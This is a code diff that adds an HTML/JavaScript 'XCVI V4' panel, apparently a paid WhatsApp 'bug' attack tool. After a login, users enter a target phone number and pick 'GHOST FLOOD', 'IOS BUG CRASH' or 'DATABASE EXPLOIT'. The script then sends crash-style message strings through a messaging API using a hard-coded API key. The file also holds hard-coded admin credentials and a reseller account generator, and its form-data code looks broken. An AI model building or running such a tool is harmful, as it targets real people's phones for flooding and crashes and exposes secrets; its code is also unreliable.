@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XCVI V4 - MODULAR EDITION</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon: #00d2ff; --bg: #000000; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: white; overflow: hidden; }
+        .cyber-font { font-family: 'Orbitron', sans-serif; }
+        .glass { background: rgba(15, 15, 15, 0.9); backdrop-filter: blur(10px); border: 1px solid rgba(0, 210, 255, 0.1); border-radius: 20px; }
+        .input-style { background: #0a0a0a; border: 1px solid rgba(255, 255, 255, 0.05); color: white; outline: none; }
+        .screen { position: fixed; inset: 0; transition: 0.5s ease; width: 100%; height: 100%; overflow-y: auto; padding-bottom: 110px; }
+        .hide { transform: scale(0.9); opacity: 0; pointer-events: none; }
+        .nav-active { color: var(--neon); filter: drop-shadow(0 0 5px var(--neon)); }
+        .page { display: none; }
+        .page-active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <audio id="bg-audio" loop></audio>
+
+    <div id="scr-login" class="screen flex flex-col items-center justify-center p-8 z-[2000] bg-black">
+        <h1 class="cyber-font text-4xl font-black mb-10 italic">XCVI<span class="text-blue-500">V4</span></h1>
+        <div class="w-full max-w-xs space-y-4">
+            <input type="text" id="u-in" placeholder="USERNAME" class="input-style w-full p-5 rounded-2xl text-[10px] font-bold text-center uppercase tracking-widest">
+            <input type="password" id="p-in" placeholder="ACCESS KEY" class="input-style w-full p-5 rounded-2xl text-[10px] font-bold text-center tracking-widest">
+            <button onclick="handleLogin()" class="w-full py-5 bg-blue-600 rounded-2xl cyber-font font-black text-[11px] shadow-lg">INITIALIZE</button>
+        </div>
+    </div>
+
+    <div id="scr-main" class="screen hide">
+        
+        <div class="p-6 flex justify-between items-center sticky top-0 bg-black/95 backdrop-blur-md z-50 border-b border-white/5">
+            <h1 class="cyber-font text-xs font-black tracking-widest">XCVI <span id="page-title" class="text-blue-500">PROFILE</span></h1>
+            <button onclick="handleLogout()" class="text-[9px] font-black text-red-500 border border-red-500/30 px-3 py-1 rounded-full uppercase">Log Out</button>
+        </div>
+
+        <div id="pg-profile" class="page page-active p-5 space-y-5">
+            <div class="glass p-6 border-l-4 border-blue-500">
+                <p class="text-[10px] text-gray-500 font-bold mb-4 uppercase tracking-widest">User Credentials</p>
+                <div class="space-y-4">
+                    <div>
+                        <p class="text-[9px] text-gray-600 uppercase">Username</p>
+                        <p id="prof-u" class="cyber-font text-sm font-bold text-white">-</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] text-gray-600 uppercase">Rank Status</p>
+                        <p id="prof-r" class="text-xs font-bold text-blue-400">-</p>
+                    </div>
+                    <div>
+                        <p class="text-[9px] text-gray-600 uppercase">Access Expiry</p>
+                        <p id="prof-e" class="text-xs font-bold text-red-500">-</p>
+                    </div>
+                </div>
+            </div>
+            <div class="glass p-6">
+                <p class="text-[9px] text-gray-500 font-bold mb-3 uppercase">Music Atmosphere</p>
+                <input type="text" id="music-url" placeholder="Direct MP3 Link" class="input-style w-full p-3 rounded-lg text-[10px] mb-3">
+                <button onclick="saveMusic()" class="w-full py-2 bg-white/5 text-[9px] font-bold rounded-lg border border-white/10">SAVE TRACK</button>
+            </div>
+        </div>
+
+        <div id="pg-create" class="page p-5 space-y-5">
+            <div id="mgmt-area" class="hidden space-y-5">
+                <h2 class="cyber-font text-[10px] text-blue-500 ml-2">ACCESS GENERATOR</h2>
+                <div class="glass p-6 space-y-3">
+                    <input type="text" id="new-u" placeholder="Username" class="input-style w-full p-4 rounded-xl text-[10px]">
+                    <input type="text" id="new-p" placeholder="Password" class="input-style w-full p-4 rounded-xl text-[10px]">
+                    <div class="grid grid-cols-2 gap-3">
+                        <select id="new-r" class="input-style p-4 rounded-xl text-[10px] bg-black">
+                            <option value="MEMBER">MEMBER</option>
+                            <option id="opt-reseller" value="RESELLER">RESELLER</option>
+                        </select>
+                        <input type="number" id="new-d" placeholder="Days" class="input-style p-4 rounded-xl text-[10px]">
+                    </div>
+                    <button onclick="execCreateUser()" class="w-full py-4 bg-blue-600 text-[10px] font-black rounded-xl">CREATE ACCOUNT</button>
+                </div>
+            </div>
+            <div id="no-access-msg" class="text-center p-10 text-gray-600 text-xs italic">
+                You don't have permission to create users.
+            </div>
+        </div>
+
+        <div id="pg-attack" class="page p-5 space-y-5">
+            <div class="glass p-6 border-b-4 border-blue-600">
+                <h2 class="cyber-font text-xs font-black mb-6">ATTACK VECTOR</h2>
+                <div class="space-y-4">
+                    <input type="text" id="atk-target" placeholder="628xxxxxxxx" class="input-style w-full p-5 rounded-2xl text-sm font-black text-blue-400">
+                    <select id="atk-method" class="input-style w-full p-5 rounded-2xl text-xs font-black bg-black">
+                        <option value="GHOST">GHOST FLOOD [V4]</option>
+                        <option value="IOS">IOS BUG CRASH [VIP]</option>
+                        <option value="EXPLOIT">DATABASE EXPLOIT [BETA]</option>
+                    </select>
+                    <button onclick="execAttack()" class="w-full py-5 bg-blue-600 rounded-2xl cyber-font font-black text-xs shadow-xl active:scale-95">SEND ATTACK</button>
+                </div>
+            </div>
+            <div class="glass p-4 bg-black/50 text-[9px] font-mono h-32 overflow-y-auto" id="logs">
+                <div class="text-gray-600">[SYS] Awaiting command...</div>
+            </div>
+        </div>
+
+        <div class="fixed bottom-6 left-1/2 -translate-x-1/2 w-[90%] max-w-sm h-20 glass bg-black/95 flex justify-around items-center px-4 z-[1000] rounded-[30px] border border-white/10">
+            <button onclick="navTo('profile', this)" class="nav-btn nav-active flex flex-col items-center">
+                <span class="text-[9px] font-black cyber-font">PROFILE</span>
+            </button>
+            <button onclick="navTo('create', this)" class="nav-btn text-gray-500 flex flex-col items-center">
+                <span class="text-[9px] font-black cyber-font">CREATE</span>
+            </button>
+            <button onclick="navTo('attack', this)" class="nav-btn text-gray-500 flex flex-col items-center">
+                <span class="text-[9px] font-black cyber-font">ATTACK</span>
+            </button>
+        </div>
+
+    </div>
+
+    <script>
+        const API_KEY = "WgRVV1aVdUQznEFmJ2vP";
+        let db = JSON.parse(localStorage.getItem('XC_DB')) || {
+            "TirnezzNesia": { p: "252532", r: "ADMIN", e: 9999999999999 }
+        };
+        let session = null;
+
+        function handleLogin() {
+            const u = document.getElementById('u-in').value;
+            const p = document.getElementById('p-in').value;
+            const user = db[u];
+
+            if(user && user.p === p) {
+                if(new Date().getTime() > user.e) return alert("Expired!");
+                session = { u, ...user };
+                
+                // Switch Screen
+                document.getElementById('scr-login').classList.add('hide');
+                document.getElementById('scr-main').classList.remove('hide');
+                
+                // Update Profile UI
+                document.getElementById('prof-u').innerText = u;
+                document.getElementById('prof-r').innerText = user.r;
+                document.getElementById('prof-e').innerText = user.r === "ADMIN" ? "PERMANENT" : new Date(user.e).toLocaleDateString();
+
+                // Setup Privileges
+                if(user.r === "ADMIN" || user.r === "RESELLER") {
+                    document.getElementById('mgmt-area').classList.remove('hidden');
+                    document.getElementById('no-access-msg').classList.add('hidden');
+                    if(user.r === "RESELLER") document.getElementById('opt-reseller').classList.add('hidden');
+                }
+
+                const aud = document.getElementById('bg-audio');
+                aud.src = localStorage.getItem('XC_MUSIC') || "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3";
+                aud.play();
+            } else { alert("ACCESS DENIED"); }
+        }
+
+        function handleLogout() {
+            location.reload(); // Refresh to clear session and go back to login
+        }
+
+        function navTo(pageId, el) {
+            // Change Active Page
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('page-active'));
+            document.getElementById('pg-' + pageId).classList.add('page-active');
+            
+            // Change Nav Style
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.replace('nav-active', 'text-gray-500'));
+            el.classList.add('nav-active');
+            el.classList.remove('text-gray-500');
+
+            // Change Header Title
+            document.getElementById('page-title').innerText = pageId.toUpperCase();
+        }
+
+        function execCreateUser() {
+            const u = document.getElementById('new-u').value;
+            const p = document.getElementById('new-p').value;
+            const r = document.getElementById('new-r').value;
+            const d = parseInt(document.getElementById('new-d').value);
+            if(u && p && d) {
+                db[u] = { p, r, e: new Date().getTime() + (d * 24 * 60 * 60 * 1000) };
+                localStorage.setItem('XC_DB', JSON.stringify(db));
+                alert(`SUCCESS: Account ${u} Created!`);
+                document.getElementById('new-u').value = "";
+                document.getElementById('new-p').value = "";
+            }
+        }
+
+        async function execAttack() {
+            const target = document.getElementById('atk-target').value;
+            const method = document.getElementById('atk-method').value;
+            if(!target) return alert("TARGET REQUIRED");
+
+            let msg = (method === "GHOST") ? "‎" : (method === "IOS") ? "๑҉ BUG ๑҉" : "素晴座素晴RISHI素晴座素晴_EXPLOIT";
+
+            try {
+                const res = await fetch('https://api.fonnte.com/send', {
+                    method: 'POST',
+                    headers: { 'Authorization': API_KEY },
+                    body: new FormData(Object.assign(new FormData(), { target, message: msg }))
+                });
+                document.getElementById('logs').innerHTML = `<div class="text-green-500">[${new Date().toLocaleTimeString()}] SUCCESS -> ${target}</div>` + document.getElementById('logs').innerHTML;
+            } catch (e) {
+                document.getElementById('logs').innerHTML = `<div class="text-red-500">[ERR] API DOWN</div>` + document.getElementById('logs').innerHTML;
+            }
+        }
+
+        function saveMusic() {
+            const url = document.getElementById('music-url').value;
+            if(url) { localStorage.setItem('XC_MUSIC', url); location.reload(); }
+        }
+    </script>
+</body>
+</html>
